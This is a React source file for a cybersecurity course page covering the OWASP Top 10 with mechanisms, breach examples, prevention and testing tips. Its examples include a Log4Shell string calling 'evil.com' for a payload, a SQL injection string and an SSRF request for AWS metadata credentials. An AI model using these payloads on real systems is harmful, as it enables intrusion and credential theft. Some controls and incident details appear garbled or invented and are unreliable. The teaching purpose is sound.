'use client'
import { useEffect } from 'react';
import DocHeading from '@/components/base/DocHeading';
import Callout from '@/components/base/Callout';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

const owaspCategories = [
  {
    rank: 1,
    title: 'Broken Access Control',
    description: 'Restrictions on what authenticated users can do are not enforced properly. Attackers can gain unauthorized access to other users\u2019 accounts, files, or data.',
    howItWorks: 'User can modify URL or request parameters to access data they shouldn\u2019t. Missing verification of user permissions on server-side.',
    example: 'GET /account/transfer?to=12345&amount=10000  Attacker changes 12345 to attacker account ID and transfers money.',
    cwe: 'CWE-284 (Improper Access Control)',
    prevalence: 'Affects 34% of applications. Highest severity impact possible (data breach, account takeover).',
    realIncidents: [
      'Facebook/Instagram (2018): Privacy bug allowed changing any video\u2019s privacy settings via access control flaw in GraphQL API permitting unauthorized access to private videos.',
      'Twitter (2020): Privilege escalation vulnerability allowed any user to turn on \u201cProtect your tweets\u201d setting for any account via API bug.',
    ],
    prevention: [
      'Enforce access control on every request, never trust client-side checks',
      'Deny by default unless explicitly allowed',
      'Implement least privilege\u2014users get only required permissions',
      'Use framework access control mechanisms (Spring Security, ASP.NET Authorization) rather than custom code',
      'Log and monitor access control failures',
    ],
    testing: 'Attempt parameter tampering (user_id, account_id). Test horizontal (same privilege) and vertical (elevated privilege) access. Check if you can access files outside your directory.',
    icon: 'ri-shield-x-line',
    color: 'cyber-red',
  },
  {
    rank: 2,
    title: 'Cryptographic Failures',
    description: 'Sensitive data exposed due to weak or missing encryption in transit or at rest. Previously called \u201cSensitive Data Exposure\u201d.',
    howItWorks: 'Data transmitted in plain HTTP, stored with weak encryption or no encryption, or keys hardcoded in source code.',
    example: 'Web app uses HTTP for login page. Attacker on public WiFi intercepts credentials with packet sniffer (Wireshark).',
    cwe: 'CWE-311 (Missing Encryption), CWE-326 (Weak Encryption)',
    prevalence: '17% of vulnerabilities, but highest potential impact (full data breach).',
    realIncidents: [
      'Equifax (2017): Unencrypted personal data (SSNs, DOB) of 147 million people exposed due to unpatched Struts vulnerability and lack of encryption at rest.',
      'T-Mobile (2021): API didn\u2019t require authentication for account lookup, exposing names, addresses, phone numbers, and partial SSNs of 50M customers.',
    ],
    prevention: [
      'Encrypt all data in transit (TLS 1.3 everywhere, HSTS), at rest (AES-256 full-disk or database encryption)',
      'Never store sensitive data you don\u2019t need (PCI-DSS: don\u2019t store CVV, SSN only if absolutely necessary)',
      'Use strong, up-to-date algorithms (AES-256, RSA-3072+, SHA-256+)',
      'Protect encryption keys in secure storage (HSM, cloud KMS, not source code)',
      'Disable caching of sensitive pages',
    ],
    testing: 'Intercept traffic with Burp Suite\u2014is everything HTTPS? Check database encryption at rest. Search source code for hardcoded keys.',
    icon: 'ri-lock-unlock-line',
    color: 'cyber-amber',
  },
  {
    rank: 3,
    title: 'Injection Flaws',
    description: 'Untrusted data sent to interpreter as part of command or query. Original type (SQL, NoSQL, OS, LDAP) but all share same core issue: data and code not separated.',
    howItWorks: 'User input concatenated directly into SQL query, shell command, or LDAP filter. Attacker provides crafted input that changes query meaning.',
    example: 'SQLi: \u201c OR \u20181\u2019=\u20191\u2019 --  turns SELECT * FROM users WHERE name = \u2018\u2019 into SELECT * FROM users WHERE name = \u2018\u2019 OR \u20181\u2019=\u20191\u2019 -- (always true).',
    cwe: 'CWE-89 (SQL Injection), CWE-78 (OS Command Injection), CWE-91 (XML Injection)',
    prevalence: '19% of all reported vulnerabilities. Consistently top of OWASP Top 10.',
    realIncidents: [
      'Sony Pictures (2011): SQL injection in web application gave attackers initial foothold, leading to network breach, data theft (emails, unreleased films), and system wipe.',
      'PBS (2011): SQL injection in WordPress site allowed attackers to steal 52,000+ user credentials and deface main website.',
    ],
    prevention: [
      'Use parameterized queries (prepared statements) for all database access\u2014never string concatenation',
      'Stored procedures with bind variables (not dynamic SQL)',
      'ORM frameworks (Hibernate, Entity Framework) protect against SQLi',
      'Input validation (deny lists for dangerous characters, but not primary defense)',
      'Least privilege DB accounts\u2014application user shouldn\u2019t have DROP permission',
      'ESC (Exploit Sanitization Columns) or RASP (Runtime Application Self-Protection)',
    ],
    testing: 'Enter single quote (\u201c)\u201d in input field. Look for error messages. Use sqlmap automated tool. Check for odd behavior.',
    icon: 'ri-code-s-slash-line',
    color: 'cyber-cyan',
  },
  {
    rank: 4,
    title: 'Insecure Design',
    description: 'Flaws in architecture and design, not implementation. Missing or ineffective control design. Business logic flaws.',
    howItWorks: 'System lacks fundamental security controls from design phase. No threat modeling. Requirements don\u2019t include security.',
    example: 'E-commerce site doesn\u2019t verify inventory before deducting stock during checkout. Attacker orders 1000 items even if only 10 in inventory.',
    cwe: 'CWE-444 (Inconsistent Interpretation), CWE-603 (Design Error)',
    prevalence: 'New OWASP category (2021). Recognizes many breaches stem from flawed design, not coding bugs.',
    realIncidents: [
      'Log4Shell (2021): Design decision to allow remote code execution via JNDI lookups in logging statements created global crisis. Apache designed feature without security consideration.',
      'Bridewell Hotel Booking (2020): Business logic flaw allowed negative prices. Negative price applied as credit during booking\u2014users received free rooms with negative balance (hotel owed money).',
    ],
    prevention: [
      'Threat modeling during design phase (STRIDE, PASTA)',
      'Secure design patterns and principles (defense in depth, least privilege, fail secure)',
      'Security requirements in user stories (\u201cAs a user, I want my password encrypted\u201d)',
      'Architecture reviews with security focus',
      'Secure coding standards and peer design reviews',
    ],
    testing: 'Review architecture for missing controls. Check for business logic bypass (discount codes, workflow circumvention).',
    icon: 'ri-draft-line',
    color: 'cyber-purple',
  },
  {
    rank: 5,
    title: 'Security Misconfiguration',
    description: 'Insecure default configurations, open cloud storage, verbose error messages revealing secrets, unnecessary services enabled.',
    howItWorks: 'Dev or test configurations deployed to production. Default passwords unchanged. Debug mode enabled. Directory listing allowed.',
    example: 'AWS S3 bucket set to \u201cpublic-read\u201d instead of private. Exposed customer PII, credit card data to internet.',
    cwe: 'CWE-16 (Configuration), CWE-538 (File/Directory Exposure)',
    prevalence: '14% of applications. Extremely common—DevOps velocity often bypasses security hardenings.',
    realIncidents: [
      'Capital One (2019): Misconfigured AWS WAF rule allowed SSRF, leading to 100M+ records stolen from S3. Combined with excessive IAM permissions.',
      'Microsoft Power Apps (2022): Default OData filter not enabled, exposing 38M records across 2,000+ organizations including vaccination records, COVID test results.',
    ],
    prevention: [
      'Immutable infrastructure (images pre-hardened, not configured post-deploy)',
      'Automated configuration scanning (CIS Benchmarks, cloud security posture tools)',
      'Remove/replace default accounts and passwords',
      'Disable directory listing, verbose error messages in production',
      'Infrastructure as Code (IaC) with security baked into templates (Terraform, CloudFormation)',
      'Regular automated scanning (Qualys, Nessus) and compliance audits',
    ],
    testing: 'Check default credentials. Attempt to access /admin, /backup directories. Review cloud storage permissions. Check HTTP headers revealing server versions.',
    icon: 'ri-settings-3-line',
    color: 'cyber-green',
  },
  {
    rank: 6,
    title: 'Vulnerable & Outdated Components',
    description: 'Using components with known vulnerabilities (libraries, frameworks, OS, containers). \u201cLog4Shell\u201d made this top of mind.',
    howItWorks: 'Application includes outdated dependency (Log4j 2.x, older jQuery with XSS, unpatched OS). Attackers exploit public CVE.',
    example: 'Apache Log4j 2.x with JNDI lookup enabled. Attacker sends User-Agent: ${jndi:ldap://evil.com/payload}. Server resolves LDAP, downloads and executes malicious class.',
    cwe: 'CWE-1104 (Use of Unmaintained Code)',
    prevalence: 'Almost every application uses third-party libraries. Average modern app has 500+ dependencies.',
    realIncidents: [
      'Log4Shell (2021): vulnerability in ubiquitous Apache Log4j logging library. Affected millions of Java applications globally (Minecraft servers, Amazon, Apple, Tesla, etc.). Required mass patching across all Java applications.',
      'SolarWinds (2020): Compromised build system inserted backdoor into signed Orion software update. Third-party software supply chain attack affected 18,000+ organizations.',
    ],
    prevention: [
      'Software Composition Analysis (SCA) tools: Snyk, Dependabot, OWASP Dependency-Check',
      'Monitoring CVE feeds (NVD, vendor advisories) for dependencies',
      'Remove unused dependencies\u2014smaller attack surface',
      'Regular patch cycles\u2014security updates applied within SLA (typically 30 days for critical)',
      'Virtual patching (WAF rule) when immediate patch unavailable',
      'SBOM (Software Bill of Materials) inventory\u2014know exactly what\u2019s in your software',
    ],
    testing: 'Use OWASP Dependency-Check, npm audit, bundler-audit. Check versions against NVD for known CVEs.',
    icon: 'ri-database-2-line',
    color: 'cyber-cyan',
  },
  {
    rank: 7,
    title: 'Identification & Authentication Failures',
    description: 'Weak password policies, credential stuffing, insecure password recovery, session fixation. Previously \u201cBroken Authentication\u201d split into this and Access Control.',
    howItWorks: 'Weak password policy (123456 allowed), no rate limiting on login, predictable session tokens, credential stuffing attacks succeed.',
    example: 'Web app allows password \u201c123456\u201d. Attacker uses credential stuffing (email:password combos from previous breaches) to log in as admin user using lifted credentials.',
    cwe: 'CWE-287 (Improper Authentication), CWE-384 (Session Fixation)',
    prevalence: '40% of data breaches involve weak or stolen credentials.',
    realIncidents: [
      'Collection #1 (2019): 21 billion unique email:password pairs posted online. Enabled massive credential stuffing attacks across dozens of sites.',
      'Twitter (2020): Social engineering of employees bypassed MFA, but initial entry was via leaked credentials used to access VPN.',
    ],
    prevention: [
      'MFA mandatory\u2014blocks 99.9% of automated credential attacks',
      'Rate limiting / account lockout after N failed attempts (with care to avoid DoS)',
      'Check passwords against HaveIBeenPwned API when setting new password',
      'Secure session management: regenerate ID on login, HttpOnly cookies, short timeout',
      'Enforce password policy: 8+ chars, complexity, no common passwords',
      'CAPTCHAs to slow down automated attacks',
    ],
    testing: 'Attempt weak passwords. Try SQLi in login. Check if session ID changes after login (fixation). Attempt to reuse session token from another browser.',
    icon: 'ri-user-unfollow-line',
    color: 'cyber-red',
  },
  {
    rank: 8,
    title: 'Software & Data Integrity Failures',
    description: 'Code and infrastructure integrity violations: unsigned code, untrusted CI/CD pipelines, insecure deserialization. Related to Supply Chain attacks.',
    howItWorks: 'Attacker modifies code or dependencies in transit or at rest. No integrity checks. Deserialization of untrusted data executes code.',
    example: 'Software update not signed. Man-in-middle replaces update with malware. Deserialization of JSON/XML data with embedded executable code.',
    cwe: 'CWE-494 (Download Code Without Integrity Check), CWE-502 (Untrusted Deserialization)',
    prevalence: 'Supply chain attacks increased 650% in 2022 (Sonatype).',
    realIncidents: [
      'SolarWinds (2020): Supply chain compromise of Orion updates. Attackers inserted backdoor into legitimate signed update distributed to 18,000+ customers.',
      'CodeCov (2021): Bash script uploader modified to steal AWS credentials from CI environment, affecting hundreds of companies.',
    ],
    prevention: [
      'Code signing with hardware security modules (HSM)\u2014private key never leaves hardware',
      'Reproducible builds\u2014verify binary matches source',
      'SBOM (Software Bill of Materials) for transparency',
      'Verify digital signatures of all dependencies and updates',
      'Secure CI/CD pipelines (isolated runners, signed commits, PR approval)',
      'Never deserialize untrusted data (use JSON, not binary serialization)',
    ],
    testing: 'Verify all updates signed. Check CI/CD pipeline permissions. Audit dependencies for unsigned packages. Look for serialization libraries in code.',
    icon: 'ri-file-code-line',
    color: 'cyber-amber',
  },
  {
    rank: 9,
    title: 'Security Logging & Monitoring Failures',
    description: 'Insufficient logging, monitoring, or alerting. Cannot detect breaches in progress. Audit logs incomplete or tamperable.',
    howItWorks: 'No logging of authentication attempts. Logs not centralized. No alerts for suspicious activity. Logs stored locally (attacker deletes).',
    example: 'Attacker performs brute force login from single IP over hours. No logging or alerting, so successful compromise goes unnoticed.',
    cwe: 'CWE-778 (Insufficient Logging)',
    prevalence: '57% of breaches take months to discover because logging/monitoring inadequate.',
    realIncidents: [
      'Colonial Pipeline (2021): Attackers used compromised VPN password. No MFA, poor monitoring. Ransomware deployed before detection. 5-day fuel shortage across US East Coast.',
      'Target (2013): Attackers in network for 3 weeks before detection. Firewall alerts ignored, monitoring tools failed to correlate events.',
    ],
    prevention: [
      'Centralized logging (SIEM: Splunk, Elasticsearch, Sentinel)',
      'Log all authentication attempts (success/failure), access control failures, input validation failures',
      'Audit trail includes sufficient context: user, timestamp, IP, user agent, action, resource',
      'Real-time alerts and monitoring for critical events (multiple failed logins, privilege escalation)',
      'Integrate with SOAR for automated response',
      'Protect logs from tampering (write-once storage, centralized collection)',
    ],
    testing: 'Can you see failed login attempts in logs? Are logs encrypted and protected? What triggers alert?',
    icon: 'ri-eye-line',
    color: 'cyber-green',
  },
  {
    rank: 10,
    title: 'Server-Side Request Forgery (SSRF)',
    description: 'Attacker tricks server into making requests to internal resources or external systems it can access. Can lead to cloud metadata theft, internal network scanning.',
    howItWorks: 'Web app fetches URL provided by user (for screenshot, import, metadata). Attacker provides internal IP (169.254.169.254 AWS metadata). Server fetches internal resource, returns to attacker.',
    example: 'Cloud metadata attack: GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ returns AWS IAM role credentials from cloud metadata service.',
    cwe: 'CWE-918 (SSRF)',
    prevalence: 'Rising dramatically with cloud adoption (AWS/GCP/Azure metadata services accessible from application servers).',
    realIncidents: [
      'Capital One (2019): SSRF flaw in WAF allowed attacker to query AWS EC2 metadata service, stealing temporary IAM credentials, accessing 100M+ customer records in S3.',
      'Microsoft Power Apps (2022): Misconfiguration allowed SSRF attacks against internal services, exposing 38M+ records.',
    ],
    prevention: [
      'Network segmentation: application servers shouldn\u2019t access sensitive services (metadata, internal APIs)',
      'URL allowlisting for outbound requests',
      'Disable HTTP redirections in server-side requests',
      'Validate and sanitize all user-provided URLs',
      'Cloud metadata service access only via IAM policies, not from application instances',
    ],
    testing: 'Pass internal IPs (127.0.0.1, 10.0.0.1, 169.254.169.254) to URL parameters. See if server fetches internal resource.',
    icon: 'ri-global-line',
    color: 'cyber-cyan',
  },
];

export default function CommonVulnerabilitiesOwaspPage() {
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
      <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-red/10 border border-cyber-red/20 text-cyber-red text-xs font-medium font-mono mb-4">
          <i className="ri-book-open-line" />
          Module 5 of 20 — Offensive Security
        </div>
        <DocHeading level={1}>Common Vulnerabilities & OWASP Top 10</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3 text-lg">
          The <strong className="text-cyber-cyan">OWASP Top 10</strong> is the definitive security awareness document for web applications. Updated every 3–4 years, it ranks the 10 most critical web application security risks along with prevalence data, exploitability, and impact. Understanding these categories helps you recognize, prevent, and fix vulnerabilities before attackers exploit them.
        </p>

        <Callout type="danger" className="mt-4">
          <strong>Why OWASP Top 10 Matters:</strong> These 10 categories represent the vast majority of reported vulnerabilities. A single OWASP flaw (SQL injection, broken access control) can lead to full system compromise. Every developer, pentester, and security professional must know these risks.
        </Callout>
      </motion.div>

      {/* Top 10 Deep Dive */}
      <motion.section className="mt-12" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <DocHeading level={2}>OWASP Top 10 2021: Complete Analysis</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          Each category includes exploitation technique, real-world incident analysis, detection methods, and comprehensive prevention strategies. These aren\u2019t academic exercises—these flaws appear in production systems daily.
        </p>

        <div className="mt-8 space-y-6">
          {owaspCategories.map((category, i) => (
            <div key={category.title} className="cyber-card p-6">
              {/* Header */}
              <div className="flex items-start gap-4">
                <div className={`w-12 h-12 rounded-lg bg-${category.color}/10 border-2 border-${category.color} flex items-center justify-center shrink-0`}>
                  <span className={`text-${category.color} text-lg font-bold font-mono`}>#{category.rank}</span>
                </div>
                <div className="flex-1">
                  <div className="flex items-center gap-2 mb-2">
                    <i className={`${category.icon} text-${category.color}`} />
                    <h3 className="text-base font-semibold text-white">{category.title}</h3>
                  </div>
                  <p className="text-sm text-cyber-text leading-relaxed mb-2">{category.description}</p>
                  <div className="flex flex-wrap items-center gap-3">
                    <span className={`px-2 py-0.5 rounded bg-${category.color}/10 text-${category.color} text-xs font-mono border border-${category.color}/20`}>
                      {category.cwe}
                    </span>
                    <span className="px-2 py-0.5 rounded bg-cyber-bg text-cyber-text text-xs font-mono border border-cyber-border">
                      Prevalence: {category.prevalence}
                    </span>
                  </div>
                </div>
              </div>

              {/* How It Works */}
              <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="p-3 rounded bg-cyber-bg border border-cyber-border">
                  <h4 className="text-xs font-semibold text-cyber-amber mb-1">Vulnerability Mechanism:</h4>
                  <p className="text-xs text-cyber-text leading-relaxed">{category.howItWorks}</p>
                  <div className="mt-2 p-2 rounded bg-cyber-amber/5 font-mono text-xs text-cyber-amber">
                    {category.example}
                  </div>
                </div>

                <div className="p-3 rounded bg-cyber-bg border border-cyber-border">
                  <h4 className="text-xs font-semibold text-cyber-green mb-1">Prevention Checklist:</h4>
                  <ul className="text-xs text-cyber-green space-y-1 list-disc list-inside">
                    {category.prevention.map((item) => (
                      <li key={item}>{item}</li>
                    ))}
                  </ul>
                </div>
              </div>

              {/* Real Incidents */}
              {category.realIncidents && (
                <div className="mt-4">
                  <h4 className="text-xs font-semibold text-cyber-red mb-2">Real-World Breaches Using This Vulnerability:</h4>
                  <div className="space-y-2">
                    {category.realIncidents.map((incident, idx) => (
                      <div key={idx} className="p-3 rounded bg-cyber-red/5 border border-cyber-red/10">
                        <p className="text-xs text-cyber-red leading-relaxed">{incident}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Testing Approach */}
              {category.testing && (
                <div className="mt-4 p-3 rounded bg-cyber-purple/5 border border-cyber-purple/10">
                  <h4 className="text-xs font-semibold text-cyber-purple mb-1">How to Test for This Vulnerability:</h4>
                  <p className="text-xs text-cyber-text leading-relaxed">{category.testing}</p>
                </div>
              )}
            </div>
          ))}
        </div>
      </motion.section>

      {/* OWASP Risk Rating Methodology */}
      <motion.section className="mt-12" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <DocHeading level={2}>Understanding OWASP Risk Assessment</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          OWASP Top 10 ranks risks based on likelihood (how often flaw exists, how easy to exploit) and impact (technical and business consequences).
        </p>

        <div className="mt-6 grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="cyber-card p-5">
            <h3 className="text-sm font-semibold text-white mb-4">Likelihood Factors</h3>
            <div className="space-y-3">
              {[
                { factor: 'Ease of Detection', desc: 'How easily can attacker find the vulnerability? (Tool-assisted? Manual?)' },
                { factor: 'Ease of Exploit', desc: 'Technical skill required? Public exploit available? Automated tools?' },
                { factor: 'Awareness', desc: 'Is vulnerability well-known (CVE) or obscure?' },
                { factor: 'Detection', desc: 'Can defenders detect the exploit in logs/IDS?' },
              ].map((f) => (
                <div key={f.factor} className="p-2 rounded bg-cyber-bg border border-cyber-border">
                  <p className="text-xs font-semibold text-cyber-cyan">{f.factor}</p>
                  <p className="text-xs text-cyber-text">{f.desc}</p>
                </div>
              ))}
            </div>
          </div>

          <div className="cyber-card p-5">
            <h3 className="text-sm font-semibold text-white mb-4">Impact Factors</h3>
            <div className="space-y-3">
              {[
                { factor: 'Confidentiality', desc: 'What data is exposed? PII, trade secrets, credentials?' },
                { factor: 'Integrity', desc: 'Can attacker modify or destroy data? Financial fraud potential?' },
                { factor: 'Availability', desc: 'Does exploit cause downtime? Ransomware potential?' },
                { factor: 'Scope', desc: 'Single user vs. all users? Single system vs. entire organization?' },
              ].map((f) => (
                <div key={f.factor} className="p-2 rounded bg-cyber-bg border border-cyber-border">
                  <p className="text-xs font-semibold text-cyber-red">{f.factor}</p>
                  <p className="text-xs text-cyber-text">{f.desc}</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      </motion.section>

      {/* Defense-in-Depth Against OWASP */}
      <motion.section className="mt-12" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <DocHeading level={2}>Defense-in-Depth Against OWASP Vulnerabilities</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          No single control prevents all OWASP categories. Layer defenses from development through deployment.
        </p>

        <div className="mt-6 space-y-4">
          {[
            {
              phase: 'Requirements & Design',
              controls: [
                'Threat modeling (STRIDE) identifies OWASP risks early',
                'Security requirements (authentication, encryption, logging) in user stories',
                'Secure design patterns (input validation layer, centralized auth)',
                'Privacy by design principles',
              ],
            },
            {
              phase: 'Development',
              controls: [
                'Secure coding standards (avoid string concatenation SQL, use parameterized queries)',
                'Security code reviews (peer review + automated SAST)',
                'Input validation and output encoding everywhere',
                'Password hashing with bcrypt/Argon2 (phc-winner-argon2)',
              ],
            },
            {
              phase: 'Testing',
              controls: [
                'Dynamic Application Security Testing (DAST) – Burp Suite, OWASP ZAP',
                'Static Application Security Testing (SAST) – SonarQube, CodeQL',
                'Penetration testing annually or on major changes',
                'Dependency scanning (Snyk, Dependabot) for vulnerable components',
              ],
            },
            {
              phase: 'Deployment & Operations',
              controls: [
                'Web Application Firewall (WAF) blocks known attacks in production',
                'Runtime Application Self-Protection (RASP) embeds security in app runtime',
                'Security monitoring (SIEM) alerts on attack patterns',
                'Regular vulnerability scanning and penetration testing',
              ],
            },
          ].map((phase) => (
            <div key={phase.phase} className="cyber-card p-4">
              <h3 className="text-sm font-semibold text-white mb-3">{phase.phase}</h3>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                {phase.controls.map((control) => (
                  <div key={control} className="p-2 rounded bg-cyber-bg border border-cyber-border">
                    <p className="text-xs text-cyber-text">{control}</p>
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>
      </motion.section>

      {/* OWASP Cheat Sheets Reference */}
      <motion.section className="mt-12" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <DocHeading level={2}>OWASP Resources & Further Study</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          OWASP provides free, vendor-neutral resources for secure development. These are industry standard references.
        </p>

        <div className="mt-6 grid grid-cols-1 md:grid-cols-3 gap-4">
          {[
            { title: 'OWASP Top 10 Project', desc: 'Official Top 10 document with detailed risk ratings, examples, and testing guidance for each category.', link: 'https://owasp.org/Top10' },
            { title: 'OWASP Cheat Sheet Series', desc: 'Practical guides for authentication, SQLi prevention, XSS protection, session management, and dozens of other topics.', link: 'https://cheatsheetseries.owasp.org' },
            { title: 'OWASP Web Security Testing Guide', desc: 'Comprehensive manual for penetration testers. Step-by-step testing procedures for all OWASP categories.', link: 'https://owasp.org/www-project-web-security-testing-guide' },
            { title: 'OWASP Zed Attack Proxy (ZAP)', desc: 'Free, open-source DAST tool that automatically finds OWASP Top 10 vulnerabilities in running applications.', link: 'https://www.zaproxy.org' },
            { title: 'OWASP Juice Shop', desc: 'Intentionally vulnerable modern web app for hands-on OWASP Top 10 practice. CTF-style challenges with hints.', link: 'https://owasp.org/www-project-juice-shop' },
            { title: 'OWASP Dependency-Check', desc: 'SCA tool that scans project dependencies (Maven, NPM, NuGet) against NVD for known vulnerabilities.', link: 'https://owasp.org/www-project-dependency-check' },
          ].map((resource) => (
            <div key={resource.title} className="cyber-card p-4">
              <a href={resource.link} target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-cyber-cyan hover:text-cyber-amber transition-colors">
                {resource.title}
              </a>
              <p className="text-xs text-cyber-text mt-1">{resource.desc}</p>
            </div>
          ))}
        </div>
      </motion.section>

      {/* How OWASP Categories Map to Other Courses */}
      <motion.section className="mt-12" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <DocHeading level={2}>OWASP Top 10 in This Curriculum</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          OWASP vulnerabilities appear throughout your learning journey. Build layered understanding across modules.
        </p>
        <div className="mt-6 grid grid-cols-1 md:grid-cols-2 gap-4">
          {[
            { course: 'Web Application Security Deep Dive (Module 10)', topics: ['Detailed SQL injection payloads, blind SQLi, time-based attacks', 'XSS: stored, reflected, DOM-based, CSP bypasses', 'CSRF token bypass, CORS misconfiguration', 'Secure coding practices and code review techniques'] },
            { course: 'Penetration Testing Methodologies (Module 9)', topics: ['Manual OWASP testing methodology (4-phase: recon, mapping, discovery, exploitation)', 'Burp Suite professional for OWASP scanning', 'Custom exploit development for business logic flaws', 'Reporting findings with OWASP risk rating'] },
            { course: 'Cryptography & Access Control (Modules 3 & 4)', topics: ['Broken Crypto leads to data exposure (Category 2)', 'Weak session management = authentication failures (Category 7)', 'Failed access control lets attackers bypass auth (Category 1)', 'Cryptographic failures underlie many OWASP issues'] },
            { course: 'DevSecOps Secure SDLC (Module 18)', topics: ['SAST catches Category 1–10 during development', 'DAST catches runtime Category 1,3,5 in app', 'Software composition analysis blocks Category 6 (vulnerable components)', 'CI/CD gates prevent vulnerable code deployment'] },
          ].map((item) => (
            <div key={item.course} className="cyber-card p-4">
              <h3 className="text-sm font-semibold text-cyber-cyan mb-2">{item.course}</h3>
              <ul className="text-xs text-cyber-text space-y-1 list-disc list-inside">
                {item.topics.map((t) => (
                  <li key={t}>{t}</li>
                ))}
              </ul>
            </div>
          ))}
        </div>
      </motion.section>

      {/* Key Takeaways */}
      <motion.section className="mt-12" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <DocHeading level={2}>Key Takeaways</DocHeading>
        <ul className="mt-4 space-y-2 text-cyber-text text-sm">
          <li className="flex items-start gap-2">
            <i className="ri-checkbox-circle-fill text-cyber-green mt-0.5" />
            <span><strong>OWASP Top 10 is the industry standard</strong> for web app risks. Every developer and pentester must know all 10 categories.</span>
          </li>
          <li className="flex items-start gap-2">
            <i className="ri-checkbox-circle-fill text-cyber-green mt-0.5" />
            <span><strong>Broken Access Control (#1)</strong> is most common and highest-impact vulnerability. Enforce authorization on every request.</span>
          </li>
          <li className="flex items-start gap-2">
            <i className="ri-checkbox-circle-fill text-cyber-green mt-0.5" />
            <span><strong>Injection (SQLi, OS Command, LDAP)</strong> prevented by parameterized queries, never string concatenation with user input.</span>
          </li>
          <li className="flex items-start gap-2">
            <i className="ri-checkbox-circle-fill text-cyber-green mt-0.5" />
            <span><strong>Cryptographic Failures</strong> mean data exposed in transit/at rest. TLS everywhere, encrypt sensitive data at rest, never hardcode keys.</span>
          </li>
          <li className="flex items-start gap-2">
            <i className="ri-checkbox-circle-fill text-cyber-green mt-0.5" />
            <span><strong>Vulnerable Components (#6)</strong> remediate with SCA tools. Log4j-style supply chain attacks require robust dependency management.</span>
          </li>
          <li className="flex items-start gap-2">
            <i className="ri-checkbox-circle-fill text-cyber-green mt-0.5" />
            <span><strong>SSRF (#10)</strong> rising with cloud adoption. Prevent with network segmentation, metadata service protection.</span>
          </li>
          <li className="flex items-start gap-2">
            <i className="ri-checkbox-circle-fill text-cyber-green mt-0.5" />
            <span><strong>Defense-in-depth</strong>: WAF (block known patterns), secure coding (prevent), SAST/DAST (detect), monitoring (respond).</span>
          </li>
        </ul>
      </motion.section>

      {/* Further Reading */}
      <motion.section className="mt-12 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <DocHeading level={2}>Further Reading & Resources</DocHeading>
        <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-3">
          {[
            { title: 'OWASP Top 10 2021 Official Document', desc: 'Complete OWASP Top 10 with detailed risk ratings, example flaws, testing guidance for each category.', link: 'https://owasp.org/Top10' },
            { title: 'OWASP Web Security Testing Guide', desc: '900+ pages of comprehensive penetration testing procedures for every OWASP category with step-by-step instructions.', link: 'https://owasp.org/www-project-web-security-testing-guide' },
            { title: 'Burp Suite Professional', desc: 'Industry-standard web app security testing platform used by 70%+ of professional pentesters. Includes scanner, proxy, intruder, repeater.', link: 'https://portswigger.net/burp' },
            { title: 'CWE / SANS Top 25 Most Dangerous Software Errors', desc: 'MITRE\u2019s Common Weakness Enumeration catalog with detailed descriptions, examples, and mitigations for each weakness.', link: 'https://cwe.mitre.org/top25' },
          ].map((res) => (
            <div key={res.title} className="cyber-card p-4">
              <a href={res.link} target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-cyber-cyan hover:text-cyber-amber transition-colors">
                {res.title}
              </a>
              <p className="text-xs text-cyber-text mt-1">{res.desc}</p>
            </div>
          ))}
        </div>
      </motion.section>

      {/* Navigation */}
      <motion.section className="mt-12 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="flex gap-3 justify-between items-center">
          <div className="text-sm text-cyber-text">
            <i className="ri-book-open-line" /> Module 5 of 20
          </div>
          <div className="flex gap-3">
            <a href="/cybersecurity/quiz-1" className="px-5 py-2.5 rounded-lg border border-cyber-border text-sm font-semibold text-cyber-text hover:border-cyber-amber hover:text-cyber-amber transition-all whitespace-nowrap">
              <i className="ri-arrow-left-line mr-1" /> Quiz 1
            </a>
            <a href="/cybersecurity/malware-threat-landscape" className="px-5 py-2.5 rounded-lg bg-cyber-amber text-black text-sm font-semibold hover:bg-cyber-amber/80 transition-all whitespace-nowrap">
             Next: Malware & Threats <i className="ri-arrow-right-line ml-1" />
            </a>
          </div>
        </div>
      </motion.section>
    </div>
  );
}
